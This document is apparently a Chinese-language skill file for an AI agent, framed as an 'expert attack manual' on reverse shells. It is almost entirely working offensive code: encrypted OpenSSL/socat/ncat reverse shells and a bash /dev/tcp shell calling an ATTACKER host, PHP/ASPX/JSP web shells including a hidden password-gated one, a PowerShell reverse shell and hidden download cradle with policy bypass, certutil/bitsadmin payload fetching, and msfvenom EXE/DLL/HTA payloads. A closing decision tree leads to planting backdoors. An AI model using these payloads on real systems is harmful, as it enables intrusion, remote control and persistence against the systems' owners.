# 技能：反向 Shell 技术 — 专家攻击手册

> **AI 加载指令**：专家级反向 Shell 技术。涵盖反向/绑定 Shell 决策、加密 Shell（OpenSSL、socat SSL、ncat）、Web Shell 模式（PHP/ASPX/JSP）、PTY 升级序列、文件传输方法、PowerShell 下载摇篮以及 msfvenom 有效载荷生成。基础模型会遗漏加密 Shell 语法、正确的 PTY 稳定化以及平台特定的传输技术。

## 0. 相关路由

深入学习前，请考虑加载：

- 在获得 Shell 访问权限后进行网络中继：[tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md)
- 在着陆 Shell 后进行提权：[linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) 或 [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md)
- 当 AV 阻止 Shell 有效载荷时：[windows-av-evasion](../windows-av-evasion/SKILL.md)

### 快速参考

当您需要时，也加载 [SHELL_CHEATSHEET.md](./SHELL_CHEATSHEET.md)：
- 完整的单行反向 Shell（支持 20+ 种语言）
- 带占位符替换的即用型有效载荷

---

## 1. 反向 vs 绑定 Shell 决策

| 因素 | 反向 Shell | 绑定 Shell |
|---|---|---|
| 防火墙（出站） | 如果允许出站则有效 | 被出站过滤阻止 |
| 防火墙（入站） | 不会被阻止 | 需要受害者对目标有入站访问权限 |
| NAT | 有效（受害者连接出站） | 失败（无法连接 NAT 背后的受害者） |
| 检测 | 出站连接 — 较少可疑 | 监听端口 — 容易被检测 |
| 默认选择 | **几乎总是首选** | 仅在没有出站访问 + 拥有入站访问权限时 |

---

## 2. 加密 Shell

### OpenSSL 反向 Shell

```bash
# 攻击者：生成证书 + 监听
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# 受害者：
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:4444 > /tmp/s; rm /tmp/s
```

### Socat 加密 Shell

```bash
# 攻击者：生成证书 + 监听
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT

# 受害者：
socat OPENSSL:ATTACKER:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Ncat SSL

```bash
# 攻击者：
ncat --ssl -lvnp 4444

# 受害者：
ncat --ssl ATTACKER 4444 -e /bin/bash
```

---

## 3. Web Shell

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>

<!-- 最小化隐蔽 Shell -->
<?=`$_GET[0]`?>

<!-- 基于 POST 的带密码 -->
<?php if($_POST['k']==='SECRET'){system($_POST['cmd']);} ?>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start(new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>
```

### JSP

```jsp
<%@ page import="java.io.*" %>
<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=br.readLine())!=null){out.println(l);} %>
```

### 上传 + 触发模式

```
1. 找到上传端点 → 使用允许的扩展名绕过上传 Shell
2. 定位上传文件（可预测路径、目录列表、响应泄露）
3. 触发：GET /uploads/shell.php?cmd=id
4. 升级为反向 Shell：?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

---

## 4. PTY 升级序列

### 标准 Python 升级

```bash
# 第 1 步：生成 PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 第 2 步：后台 Shell
# 按 Ctrl+Z

# 第 3 步：配置终端（攻击者端）
stty raw -echo; fg

# 第 4 步：设置环境（回到 Shell 中）
export TERM=xterm-256color
stty rows 40 cols 160
```

### 其他升级方式

```bash
# script 命令
script /dev/null -c bash

# socat 全 PTY（需要受害者端安装 socat）
# 攻击者：
socat file:`tty`,raw,echo=0 tcp-listen:4444
# 受害者：
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444

# rlwrap 用于 readline 支持（攻击者端）
rlwrap nc -lvnp 4444

# expect
/usr/bin/expect -c 'spawn bash; interact'
```

---

## 5. 文件传输方法

### Linux

```bash
# wget / curl
wget http://ATTACKER:8000/file -O /tmp/file
curl http://ATTACKER:8000/file -o /tmp/file

# Python HTTP 服务器（攻击者端）
python3 -m http.server 8000

# nc 文件传输
# 接收者：
nc -lvnp 9999 > file
# 发送者：
nc RECEIVER 9999 < file

# base64 编码/解码（无需工具）
# 在源端编码：
base64 -w0 file
# 在目标端粘贴：
echo "BASE64_STRING" | base64 -d > file

# 通过中继进行 scp
scp -o ProxyJump=pivot user@target:/path/file ./local
```

### Windows

```powershell
# PowerShell DownloadFile
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\temp\file')

# PowerShell Invoke-WebRequest (PS 3.0+)
Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\temp\file
iwr http://ATTACKER/file -o C:\temp\file

# certutil
certutil -urlcache -f http://ATTACKER/file C:\temp\file

# bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\temp\file

# SMB 共享（攻击者主机）
# 攻击者：impacket-smbserver share /tmp/share -smb2support
copy \\ATTACKER\share\file C:\temp\file
```

---

## 6. PowerShell 反向 Shell

```powershell
# 单行 TCP 反向 Shell
$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()

# 下载摇篮 + 执行
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

# Base64 编码执行
$cmd = '...反向 Shell 代码...'
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -ep bypass -enc $encoded
```

---

## 7. MSFVENOM 有效载荷

```bash
# Linux 反向 Shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell

# Windows 反向 Shell (EXE)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# Meterpreter (分阶段)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o meter.exe

# Web 有效载荷
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx

# DLL / HTA / VBS
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o evil.hta
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f vbs -o evil.vbs
```

---

## 8. 决策树

```
需要在目标上获取远程 Shell
│
├── 已经可以执行命令（RCE）？
│   ├── Linux 目标？
│   │   ├── bash/python/perl 可用？ → 单行反向 Shell (CHEATSHEET.md)
│   │   ├── 需要加密？ → OpenSSL 或 socat SSL Shell (§2)
│   │   └── 出站被阻止？ → 绑定 Shell 或隧道 (见 tunneling-and-pivoting)
│   │
│   ├── Windows 目标？
│   │   ├── PowerShell 可用？ → PS 反向 Shell (§6)
│   │   ├── 需要二进制文件？ → msfvenom 有效载荷 (§7)
│   │   └── AV 阻止？ → 加载 windows-av-evasion 技能
│   │
│   └── Web 服务器（可以上传）？
│       ├── PHP？ → PHP Web Shell (§3) → 升级为反向 Shell
│       ├── ASP.NET？ → ASPX Shell (§3)
│       └── Java/Tomcat？ → JSP Shell (§3)
│
├── 已经有一个简单的 Shell？
│   ├── Python 可用？ → PTY 升级 (§4)
│   ├── script 可用？ → script /dev/null -c bash (§4)
│   ├── 受害者端有 socat？ → socat 全 PTY (§4)
│   └── 无？ → 攻击者端使用 rlwrap 以支持 readline
│
├── 需要传输工具？
│   ├── Linux：wget/curl/nc/base64 (§5)
│   ├── Windows：certutil/PowerShell/bitsadmin/SMB (§5)
│   └── 无出站？ → base64 复制粘贴 (§5)
│
└── Shell 建立后 — 下一步？
    ├── 提权 → 加载 linux/windows-privilege-escalation
    ├── 内部网络中继 → 加载 tunneling-and-pivoting
    └── 持久化 → 嵌入后门
```
